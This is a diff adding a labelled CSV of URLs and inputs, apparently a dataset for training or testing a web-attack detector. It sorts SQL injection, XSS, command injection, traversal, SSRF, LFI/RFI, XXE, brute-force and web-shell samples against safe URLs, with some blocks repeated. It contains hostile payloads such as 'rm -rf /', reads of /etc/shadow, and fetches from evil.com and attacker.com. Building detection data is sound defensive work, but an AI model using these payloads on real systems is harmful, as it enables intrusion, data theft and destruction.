@@ -1,0 +1,264 @@
+url,attack_type
+/login?id=1 OR 1=1,sql_injection
+/login?id=2 OR 2=2,sql_injection
+/product?id=5 UNION SELECT username,password FROM users,sql_injection
+/search?q=' OR '1'='1,sql_injection
+/item?id=10; DROP TABLE users,sql_injection
+/index.php?id=1--,sql_injection
+/index.php?id=1#,sql_injection
+/login?user=admin' --,sql_injection
+/login?user=admin'#,sql_injection
+/product?id=1 AND 1=1,sql_injection
+/product?id=1 AND 1=2,sql_injection
+/news?id=1 WAITFOR DELAY '0:0:5',sql_injection
+/search?q=1%20OR%201=1,sql_injection
+/search?q=admin' OR 'a'='a,sql_injection
+/login?username=admin' OR 1=1--,sql_injection
+/index?id=1/**/OR/**/1=1,sql_injection
+/item?id=1%27%20OR%20%271%27=%271,sql_injection
+/category?id=1 OR SLEEP(5),sql_injection
+/view?id=10 UNION ALL SELECT NULL,NULL,NULL,sql_injection
+/user?id=105 OR 105=105,sql_injection
+
+<script>alert(1)</script>,xss
+<script>alert('XSS')</script>,xss
+<img src=x onerror=alert(1)>,xss
+<svg/onload=alert(1)>,xss
+<body onload=alert(1)>,xss
+<input type="text" value="<script>alert(1)</script>">,xss
+/javascript:alert(1),xss
+<iframe src="javascript:alert(1)"></iframe>,xss
+<img src="x" onerror="alert('hack')">,xss
+<details open ontoggle=alert(1)>,xss
+<a href="javascript:alert(1)">click</a>,xss
+<marquee onstart=alert(1)>,xss
+<script>document.cookie</script>,xss
+<script>fetch('http://evil.com')</script>,xss
+<embed src="javascript:alert(1)">,xss
+<object data="javascript:alert(1)">,xss
+<video><source onerror="alert(1)"></video>,xss
+<form><button formaction="javascript:alert(1)">,xss
+<img src=1 href=1 onerror=alert(1)>,xss
+<svg><script>alert(1)</script></svg>,xss
+
+/admin?cmd=ls,command_injection
+/admin?cmd=whoami,command_injection
+/admin?cmd=cat /etc/passwd,command_injection
+/run?exec=rm -rf /,command_injection
+/run?exec=shutdown -h now,command_injection
+/system?cmd=ping 127.0.0.1,command_injection
+/system?cmd=netstat -an,command_injection
+/system?cmd=ifconfig,command_injection
+/test?cmd=dir,command_injection
+/test?cmd=ipconfig,command_injection
+/index?cmd=echo hello,command_injection
+/api?cmd=curl http://evil.com,command_injection
+/api?cmd=wget http://malicious.com,command_injection
+/debug?cmd=ps aux,command_injection
+/debug?cmd=kill -9 1234,command_injection
+/run?exec=ls -la,command_injection
+/run?exec=touch hacked.txt,command_injection
+/run?exec=uname -a,command_injection
+/terminal?cmd=pwd,command_injection
+/terminal?cmd=env,command_injection
+
+../../../etc/passwd,directory_traversal
+../../../../windows/system32, directory_traversal
+../../boot.ini,directory_traversal
+../../../var/log/auth.log,directory_traversal
+../../../../etc/shadow,directory_traversal
+../../../../etc/hosts,directory_traversal
+../config.php,directory_traversal
+../../app/config.yaml,directory_traversal
+../../../private.key,directory_traversal
+../../backup.sql,directory_traversal
+../../../../home/user/.bashrc,directory_traversal
+../../../../proc/self/environ,directory_traversal
+../../../secret.txt,directory_traversal
+../../data/db.sqlite,directory_traversal
+../../../logs/error.log,directory_traversal
+../../uploads/config.json,directory_traversal
+../../temp/admin.conf,directory_traversal
+../../../web.config,directory_traversal
+../../../../etc/mysql/my.cnf,directory_traversal
+../../../root/.ssh/id_rsa,directory_traversal
+
+/home,safe
+/about,safe
+/contact,safe
+/products,safe
+/services,safe
+/blog,safe
+/profile,safe
+/settings,safe
+/dashboard,safe
+/login,safe
+/register,safe
+/help,safe
+/faq,safe
+/cart,safe
+/checkout,safe
+/search?q=shoes,safe
+/product?id=101,safe
+/user/profile?id=55,safe
+/category/electronics,safe
+/order/history,safe
+/api/getUser,safe
+/api/getProducts,safe
+/api/listOrders,safe
+/static/logo.png,safe
+/images/banner.jpg,safe
+/assets/style.css,safe
+/js/app.js,safe
+/docs/index.html,safe
+/page/1,safe
+/news/latest,safe
+/blog/post?id=10,safe
+/login?redirect=home,safe
+/profile/update,safe
+/settings/privacy,safe
+/dashboard/stats,safe
+/products?category=books,safe
+/products?category=clothes,safe
+/cart/add?id=20,safe
+/cart/remove?id=20,safe
+/order/confirm?id=555,safe
+/payment/process,safe
+/user/logout,safe
+/user/login,safe
+/contact/submit,safe
+/search?q=laptop,safe
+/product/view?id=999,safe
+/blog/archive/2025,safe
+/support/ticket,safe
+/download/manual.pdf,safe
+
+paypa1.com/login,typosquatting
+g00gle.com,typosquatting
+faceb00k.com/security,typosquatting
+arnazon.com,typosquatting
+micr0soft-support.com,typosquatting
+secure-paypal-login.com,typosquatting
+goog1e-auth.com,typosquatting
+netf1ix-billing.com,typosquatting
+apple-id-verify.com,typosquatting
+instagrarn.com,typosquatting
+
+/login?id=1 OR 1=1,sql_injection
+/login?id=1' OR '1'='1,sql_injection
+/product?id=5 UNION SELECT username,password FROM users,sql_injection
+/index.php?id=1--,sql_injection
+/index.php?id=1#,sql_injection
+/search?q=admin' --,sql_injection
+/login?user=admin' OR 1=1--,sql_injection
+/product?id=1 AND 1=2,sql_injection
+/news?id=1 WAITFOR DELAY '0:0:5',sql_injection
+/category?id=1 OR SLEEP(5),sql_injection
+/view?id=10 UNION ALL SELECT NULL,NULL,NULL,sql_injection
+/item?id=10; DROP TABLE users,sql_injection
+/search?q=1%20OR%201=1,sql_injection
+/user?id=105 OR 105=105,sql_injection
+/login?username=admin'#,sql_injection
+
+<script>alert(1)</script>,xss
+<img src=x onerror=alert(1)>,xss
+<svg/onload=alert(1)>,xss
+<body onload=alert(1)>,xss
+<a href="javascript:alert(1)">click</a>,xss
+<iframe src="javascript:alert(1)"></iframe>,xss
+<details open ontoggle=alert(1)>,xss
+<script>document.cookie</script>,xss
+<script>fetch('http://evil.com')</script>,xss
+<svg><script>alert('XSS')</script></svg>,xss
+<video><source onerror="alert(1)"></video>,xss
+<form><button formaction="javascript:alert(1)">,xss
+<input value="<script>alert(1)</script>">,xss
+
+../../../etc/passwd,directory_traversal
+../../../../etc/shadow,directory_traversal
+../../boot.ini,directory_traversal
+../../../var/log/auth.log,directory_traversal
+../../../../windows/system32,directory_traversal
+../config.php,directory_traversal
+../../../private.key,directory_traversal
+../../../../proc/self/environ,directory_traversal
+../../../root/.ssh/id_rsa,directory_traversal
+../../backup.sql,directory_traversal
+
+/admin?cmd=ls,command_injection
+/admin?cmd=whoami,command_injection
+/run?exec=rm -rf /,command_injection
+/system?cmd=cat /etc/passwd,command_injection
+/debug?cmd=ps aux,command_injection
+/run?exec=touch hacked.txt,command_injection
+/test?cmd=ipconfig,command_injection
+/api?cmd=wget http://malicious.com,command_injection
+/system?cmd=ping 127.0.0.1,command_injection
+/terminal?cmd=env,command_injection
+
+/api?url=http://localhost/admin,ssrf
+/fetch?url=http://127.0.0.1:80,ssrf
+/load?file=http://internal-service/,ssrf
+/proxy?target=http://169.254.169.254/latest/meta-data/,ssrf
+/api?url=file:///etc/passwd,ssrf
+/api?url=gopher://127.0.0.1:6379,ssrf
+/request?url=http://0.0.0.0,ssrf
+/api?url=http://intranet.local,ssrf
+/download?url=http://192.168.1.1,ssrf
+/fetch?url=dict://localhost:11211,ssrf
+
+/index.php?page=../../etc/passwd,lfi
+/index.php?page=php://filter/convert.base64-encode/resource=index.php,lfi
+/index.php?page=http://evil.com/shell.txt,rfi
+/view?file=../../config.php,lfi
+/include?file=http://malicious.com/backdoor.php,rfi
+/page?template=../../../../etc/shadow,lfi
+/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+,lfi
+/include?file=php://input,lfi
+/index.php?file=http://attacker.com/malicious.php,rfi
+
+/index.php?page=../../etc/passwd,lfi
+/index.php?page=php://filter/convert.base64-encode/resource=index.php,lfi
+/index.php?page=http://evil.com/shell.txt,rfi
+/view?file=../../config.php,lfi
+/include?file=http://malicious.com/backdoor.php,rfi
+/page?template=../../../../etc/shadow,lfi
+/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+,lfi
+/include?file=php://input,lfi
+/index.php?file=http://attacker.com/malicious.php,rfi
+
+/login?username=admin&password=123456,brute_force
+/login?username=admin&password=admin,brute_force
+/login?username=root&password=root,brute_force
+/login?username=test&password=test123,brute_force
+/login?username=admin&password=password,brute_force
+/login?username=user&password=welcome,brute_force
+/login?username=admin&password=admin123,brute_force
+/login?username=administrator&password=12345,brute_force
+/login?username=root&password=toor,brute_force
+/login?username=guest&password=guest,brute_force
+
+/product?id=10&id=20,http_parameter_pollution
+/login?user=admin&user=hacker,http_parameter_pollution
+/search?q=phone&q=laptop,http_parameter_pollution
+/page?redirect=home&redirect=evil.com,http_parameter_pollution
+/order?id=1&id=2&id=3,http_parameter_pollution
+/api?role=user&role=admin,http_parameter_pollution
+/profile?id=5&id=6,http_parameter_pollution
+/view?lang=en&lang=fr,http_parameter_pollution
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>,xxe
+<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><data>&xxe;</data>,xxe
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>,xxe
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>,xxe
+
+/upload/cmd.jsp,web_shell
+/uploads/backdoor.asp,web_shell
+/images/shell.php,web_shell
+/uploads/c99.php,web_shell
+/files/r57.php,web_shell
+/upload/reverse.jsp,web_shell
+/uploads/hack.aspx,web_shell
+/images/webshell.php,web_shell
+/upload/shell.jsp,web_shell
+/files/backdoor.php,web_shell
